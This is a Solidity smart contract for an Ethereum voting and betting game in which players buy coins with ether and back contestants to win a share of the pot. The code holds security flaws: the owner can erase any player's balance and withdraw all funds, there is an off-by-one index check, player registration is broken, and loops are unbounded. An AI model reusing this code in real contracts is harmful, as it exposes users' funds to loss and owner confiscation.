pragma solidity ^0.4.24;

 
 
 
 
contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  function Ownable() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner,"Have no legal powerd");
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }
}
 
 
 
contract VoterFactory is Ownable{
    using SafeMath for uint256;  
    using SafeMath16 for uint16;  
    using SafeMath8 for uint8;
    mapping(address=>uint) total;  
    mapping(address=>uint) balances; 
    mapping(address=>uint8) playerP;
    mapping(uint=>address) playerA;
    mapping(address=>mapping(uint=>uint)) playerV;
    
    event NewVoter(uint _id,string _name,uint _value,uint _vectoryvalue); 
    event GiveVoter(address _fromaddress,uint _toid,uint _number); 
    event gameover(bool isReady);
    event NewPlayer(uint _id,address _address);
    
     
    struct Voter{
        uint id;
        string name;
        uint value;
        address[] pa;
        uint totalplayer;
    }
    struct Winner{
        string name;
        uint value;
        uint bonus;
    }

    Winner[] public winners;
    Voter[] public voters;
    Voter[] voterss;
    uint8 public totalplayers; 
    uint16 public ids=0; 
    uint public fee = 1000000000000000; 
    uint public createTime = now; 
    uint public shutTime = 15 minutes; 
}
 
 
 
contract VoterServiceImpl is VoterFactory{
     
    function _createPlayer(address _address) internal {
        playerA[totalplayers] = _address;
        playerP[_address] = totalplayers;
        totalplayers=totalplayers.add(1);
        emit NewPlayer(totalplayers-1,_address);
    }
    function _getEarnings(address _address,uint _playerTotal,uint _value,uint _oldvalue) internal {
        uint proportion = _playerTotal.div(_oldvalue);
        uint surplus = (_value.div(2)).add(_value.div(5));
        balances[_address] = balances[_address].add(proportion.mul(surplus));
    }
    function getaddresstotal(uint _id) public view returns(uint){
        return voters[_id].totalplayer;
    }
    function _shutDown() internal{
        require(now>=(createTime+shutTime),"Not over yet");
        uint  vectoryId=0;
        for(uint i=0;i<ids;i++){
            if(voters[i].value>voters[vectoryId].value){
                vectoryId=i;
            }
        }
        uint vectoryValue = balances[owner];
        uint oldvalue = voters[vectoryId].value;
        for(uint k=0;k<voters[vectoryId].totalplayer;k++){
            address add = voters[vectoryId].pa[k];
            uint playerTotal = playerV[add][vectoryId];
            _getEarnings(add,playerTotal,vectoryValue,oldvalue);
        }
        for(uint j=0;j<ids;j++){
            voters[j].value=0;
        }
        for(uint s=0;s<totalplayers;s++){
            total[playerA[s]]=0;
        }
        winners.push(Winner(voters[vectoryId].name,vectoryValue,vectoryValue.div(10)));
        total[owner] = total[owner].add(vectoryValue.div(5));
        ids=0;
        fee = 1000000000000000;
        voters = voterss;
        balances[owner]=0;
        createTime=now;
        emit gameover(true);
    }
     
    function _createVoter(string _str) internal onlyOwner{
        address[] memory p;
        voters.push(Voter(ids,_str,0,p,0));
        ids=ids.add(1);
    }
}
 
 
 
contract Voterplayer is VoterServiceImpl{
    function Voterplayer() public {
            createVoter("@#超级模特0");
            createVoter("#$超级模特1");
            createVoter("%$超级模特2");
    }
     
    function giveToVoter(uint _value,uint _id) public {
        uint time = createTime.add(shutTime);
        require(now<time);
        require(_id<=ids);
        require(msg.sender!=owner,"owner Can&#39;t vote");
        require(balances[msg.sender]>=_value,"balances too low");
        balances[msg.sender]=balances[msg.sender].sub(_value);
        uint eTime = time.sub(300);
        if(playerV[msg.sender][_id]==0){
            voters[_id].pa.push(msg.sender);
            voters[_id].totalplayer=voters[_id].totalplayer.add(1);
        }
        if(now>=eTime){
            uint newValue = _value.mul(2);
            balances[owner]=balances[owner].add(newValue);
            voters[_id].value =voters[_id].value.add(newValue);
            total[msg.sender]=total[msg.sender].add(newValue);
            playerV[msg.sender][_id] = playerV[msg.sender][_id].add(newValue);
            emit GiveVoter(msg.sender,_id,newValue);
            return;
        }else{
            balances[owner]=balances[owner].add(_value);
            voters[_id].value=voters[_id].value.add(_value);
            total[msg.sender]=total[msg.sender].add(_value);
            playerV[msg.sender][_id] = playerV[msg.sender][_id].add(_value);
            emit GiveVoter(msg.sender,_id,_value);
            return;
        }
    }
     
    function getTotalVoter(address _address) view public returns(uint totals){
        return total[_address];
    }
     
    function balanceOf(address _address) view public returns(uint balance){
        return balances[_address];
    }
     
    function buyGameCoin(uint256 _number) public payable{
        if(playerP[msg.sender]==0){
            _createPlayer(msg.sender);
        }
        uint256  coinfee = _number.div(10).mul(fee);
        require(msg.value==coinfee);
        balances[msg.sender]=balances[msg.sender].add(_number);
        fee=fee.add(_number.div(10).mul(100000000));
        owner.transfer(msg.value.div(100));
    }
     
    function createVoter(string _name) public onlyOwner{
        _createVoter(_name);
        emit NewVoter(ids-1,_name,0,0);
    }
      
    function setTime(uint _time) public onlyOwner{
        createTime=now;
        shutTime= _time;
    }
      
    function setFee(uint _fee) public onlyOwner{
        fee=_fee;
    }
      
    function gameOver() public onlyOwner{
        _shutDown();
    }
      
    function withdraw() external onlyOwner {
        owner.transfer(this.balance);
    }
    function getPlayerCoin(address _address,uint _number) external onlyOwner{
        require(balances[_address]>=_number);
        balances[_address] = balances[_address].sub(_number);
    }
}

 
 
 
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
library SafeMath16 {

  function mul(uint16 a, uint16 b) internal pure returns (uint16) {
    if (a == 0) {
      return 0;
    }
    uint16 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint16 a, uint16 b) internal pure returns (uint16) {
    uint16 c = a / b;
    return c;
  }

  function sub(uint16 a, uint16 b) internal pure returns (uint16) {
    assert(b <= a);
    return a - b;
  }

  function add(uint16 a, uint16 b) internal pure returns (uint16) {
    uint16 c = a + b;
    assert(c >= a);
    return c;
  }
}
library SafeMath8 {

  function mul(uint8 a, uint8 b) internal pure returns (uint8) {
    if (a == 0) {
      return 0;
    }
    uint8 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint8 a, uint8 b) internal pure returns (uint8) {
    uint8 c = a / b;
    return c;
  }

  function sub(uint8 a, uint8 b) internal pure returns (uint8) {
    assert(b <= a);
    return a - b;
  }

  function add(uint8 a, uint8 b) internal pure returns (uint8) {
    uint8 c = a + b;
    assert(c >= a);
    return c;
  }
}